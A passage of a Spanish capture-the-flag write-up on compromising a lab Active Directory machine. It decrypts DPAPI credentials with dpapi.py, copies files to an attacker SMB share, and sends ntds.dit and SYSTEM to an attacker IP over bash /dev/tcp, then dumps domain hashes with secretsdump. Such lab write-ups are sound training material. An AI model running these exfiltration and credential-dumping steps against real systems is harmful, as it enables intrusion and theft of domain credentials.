<p>Aunque, aqu√≠ no nos valen estas credenciales ya que nos falta encontrar el archivo <code>credentials file</code> que es el que contiene las credenciales, con lo cual nos ponemos a enumerar los directorios del sistema. Estas son diferentes rutas donde pueden estar los archivos DPAPI almacenados, pero en este caso no los encontraremos aqu√≠.</p>
<p>Posibles rutas donde se almacenan:</p>
<ul>
<li><code>C:\Users\username\AppData\Roaming\Microsoft\Protect\*</code></li>
<li><code>C:\Users\username\AppData\Roaming\Microsoft\Credentials*</code></li>
<li><code>C:\Users\username\AppData\Roaming\Microsoft\Vault\*</code></li>
<li>Tambi√©n podemos cambiar \Roaming\ por \Local\ en las rutas.</li>
</ul>
<p>En los directorios del sistema encontramos la carpeta IT en C: y ah√≠ encontraremos el perfil archivado de Todd.Wolfie y los archivos DPAPI que busc√°bamos.</p>
<ul>
<li><code>C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110</code></li>
<li><code>C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials\772275FAD58525253490A9B0039791D3</code></li>
</ul>
<p>Entonces he probado a descargarme el Masterkey y Credentials files pero me daba el siguiente error:</p>
<p><img alt="Voleur Machine 20" loading="lazy" src="/write-ups/active_directory/medium/voleur/fotos/voleur_machine_20.png"></p>
<blockquote>
<p>You can&rsquo;t access this shared folder because your organization&rsquo;s security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.</p>
</blockquote>
<p>Esto pasa ya que algunas pol√≠ticas o por algunas versiones modernas de Windows no permiten la descarga de archivos de manera no autenticada, entonces he establecido un usuario y contrase√±a y me he conectado al servidor smb haciendo uso de ellas, ya luego he descargado los archivos.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo smbserver.py smbFolder <span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span> -username borhub -password borhub -smb2support
</span></span></code></pre></div><p><img alt="Voleur Machine 21" loading="lazy" src="/write-ups/active_directory/medium/voleur/fotos/voleur_machine_21.png"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>net use x: \\<span style="color:#ae81ff">10.10</span>.15.<span style="color:#ae81ff">254</span>\smbFolder /user<span style="color:#960050;background-color:#1e0010">:</span>borhub borhub
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>copy C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">3927696377</span>-<span style="color:#ae81ff">1337352550</span>-<span style="color:#ae81ff">2781715495</span>-<span style="color:#ae81ff">1110</span> \\<span style="color:#ae81ff">10.10</span>.15.<span style="color:#ae81ff">254</span>\smbFolder
</span></span><span style="display:flex;"><span>copy C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials\772275FAD58525253490A9B0039791D3 \\<span style="color:#ae81ff">10.10</span>.15.<span style="color:#ae81ff">254</span>\smbFolder\
</span></span></code></pre></div><p><img alt="Voleur Machine 22" loading="lazy" src="/write-ups/active_directory/medium/voleur/fotos/voleur_machine_22.png"></p>
<p>Y ahora ya tengo el archivo en mi maquina linux. Entonces procedo a desencryptar el archivo y me da la key:
<code>0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dpapi.py masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -password <span style="color:#e6db74">&#39;NightT1meP1dg3on14&#39;</span> -sid S-1-5-21-3927696377-1337352550-2781715495-1110
</span></span></code></pre></div><p><img alt="Voleur Machine 23" loading="lazy" src="/write-ups/active_directory/medium/voleur/fotos/voleur_machine_23.png"></p>
<p>Ahora tenemos tanto el archivo encryptado como la llave para descifrarlo, vamos a obtener las posibles credenciales que el archivo tenga almacenadas.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dpapi.py credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
</span></span></code></pre></div><p><img alt="Voleur Machine 24" loading="lazy" src="/write-ups/active_directory/medium/voleur/fotos/voleur_machine_24.png"></p>
<p>Es entonces cuando descubrimos las credenciales de jeremy.combs. Y ahora, sacamos un Ticket Garanting Ticket (TGT) para este usuario, ya que hemos visto que tiene permisos de inicio de sesi√≥n remota y vamos a enumerar el sistema.</p>
<p><img alt="Voleur Machine 25" loading="lazy" src="/write-ups/active_directory/medium/voleur/fotos/voleur_machine_25.png"></p>
<h1 id="escalada-de-privilegios">Escalada de Privilegios<a hidden class="anchor" aria-hidden="true" href="#escalada-de-privilegios">#</a></h1>
<p>Anteriormente hab√≠amos visto que la carpeta IT, estaba dividida en tres carpetas una para cada tipo de t√©cnico.</p>
<p><img alt="Voleur Machine 26" loading="lazy" src="/write-ups/active_directory/medium/voleur/fotos/voleur_machine_26.png"></p>
<p>Seguramente y como Jeremy es miembro de <code>Third-Line Suppport</code>, tendremos permisos para acceder a la carpeta de su grupo. Dentro de esa carpeta tenemos varios archivos e directorios interesantes. Enumer√°ndolos veo que no tengo permiso para acceder a la carpeta Backups, pero vamos a descargarnos los archivos <code>id_rsa</code> y <code>Note.txt.txt</code>.</p>
<p><img alt="Voleur Machine 27" loading="lazy" src="/write-ups/active_directory/medium/voleur/fotos/voleur_machine_27.png"></p>
<p>Usando <code>download</code> que nos da evilwinrm, nos los descargamos a nuestra m√°quina local. Si comprobamos que dice la nota de texto que hemos encontrado, vemos que el admin le dice a Jeremy que ha tenido suficiente con los backups de windows y que ha configurado parcialmente <code>WSL</code> para intentar utilizar alguna de las <code>herramientas de copia de seguridad de Linux</code>.</p>
<p><img alt="Voleur Machine 28" loading="lazy" src="/write-ups/active_directory/medium/voleur/fotos/voleur_machine_28.png"></p>
<blockquote>
<p>[!Subsistema de Windows para Linux]
WSL (Subsistema de Windows para Linux) es una caracter√≠stica de Windows que permite ejecutar un entorno Linux en una m√°quina Windows sin necesidad de una m√°quina virtual independiente o un dualboot.</p>
</blockquote>
<ul>
<li>WSL redirige los puertos SSH a los puertos 2222, 22222, 2223.</li>
</ul>
<p>En el escaneo de puertos hab√≠amos visto que el puerto 2222 estaba abierto con lo cual vamos a iniciar sesi√≥n por ssh con la clave privada seguramente del usuario svc_backup que se mencionaba en el el archivo excel.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod <span style="color:#ae81ff">600</span> id_rsa
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ssh -i id_rsa svc_backup@10.10.11.76 -p <span style="color:#ae81ff">2222</span>
</span></span></code></pre></div><p><img alt="Voleur Machine 29" loading="lazy" src="/write-ups/active_directory/medium/voleur/fotos/voleur_machine_29.png"></p>
<h2 id="abusando-de-wsl-parcialmente-configurado-para-obtener-archivos-sensibles">Abusando de WSL parcialmente configurado para obtener archivos sensibles<a hidden class="anchor" aria-hidden="true" href="#abusando-de-wsl-parcialmente-configurado-para-obtener-archivos-sensibles">#</a></h2>
<p>Ahora si hacemos sudo su, vemos que tenemos la capacidad de ponernos como root. Y como WSL monta autom√°ticamente los discos de Windows en <code>/mnt/</code> vamos a explorarlos.</p>
<p><img alt="Voleur Machine 30" loading="lazy" src="/write-ups/active_directory/medium/voleur/fotos/voleur_machine_30.png"></p>
<p>Primero voy a empezar revisando la carpeta Backup a la cual antes no ten√≠amos permiso para acceder. En esa carpeta vemos tanto que tenemos tanto el archivo ntds.din como el archivo SYSTEM.</p>
<p><img alt="Voleur Machine 31" loading="lazy" src="/write-ups/active_directory/medium/voleur/fotos/voleur_machine_31.png"></p>
<ul>
<li><code>   ntds.dit</code> -&gt; Es el archivo que contiene todos los hashes del dominio.</li>
<li><code>SYSTEM</code> -&gt; Contiene la <code>bootkey</code> (clave maestra) que se usa para descrifrar los hashes almacenados en el archivo ntds.dit.</li>
</ul>
<h3 id="extracci√≥n-de-hashes-ntlmlm---secretsdumppy">Extracci√≥n de hashes NTLM/LM - secretsdump.py<a hidden class="anchor" aria-hidden="true" href="#extracci√≥n-de-hashes-ntlmlm---secretsdumppy">#</a></h3>
<p>Con lo cual nos los descargamos usando los siguientes comandos:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#Nos transferimos el contenido del ntds.dit a nuestra m√°quina usando cat y guardandolo en ntds.dit</span>
</span></span><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">4444</span> &gt; ntds.dit
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>bash -c <span style="color:#e6db74">&#39;cat ntds.dit &gt; /dev/tcp/10.10.15.254/4444&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">4444</span> &gt; SYSTEM
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>bash -c <span style="color:#e6db74">&#39;cat SYSTEM &gt; /dev/tcp/10.10.15.254/4444&#39;</span>
</span></span></code></pre></div><p><img alt="Voleur Machine 32" loading="lazy" src="/write-ups/active_directory/medium/voleur/fotos/voleur_machine_32.png"></p>
<p>Ahora una vez descargados con secretsdump.py extraemos los hashes NTLM/LM.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
</span></span></code></pre></div><p><img alt="Voleur Machine 33" loading="lazy" src="/write-ups/active_directory/medium/voleur/fotos/voleur_machine_33.png"></p>
<p>Ahora con el hash NTLM/LM de Administrator le solicitamos el Ticket Garanting Ticket(TGT), lo exportamos y procedemos a iniciar sesi√≥n a trav√©s de evil-winrm como administradores del sistema.</p>
<p><img alt="Voleur Machine 34" loading="lazy" src="/write-ups/active_directory/medium/voleur/fotos/voleur_machine_34.png"></p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://borhuub.github.io/">Cybersecurity Borhub Home</a></span> ¬∑ 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
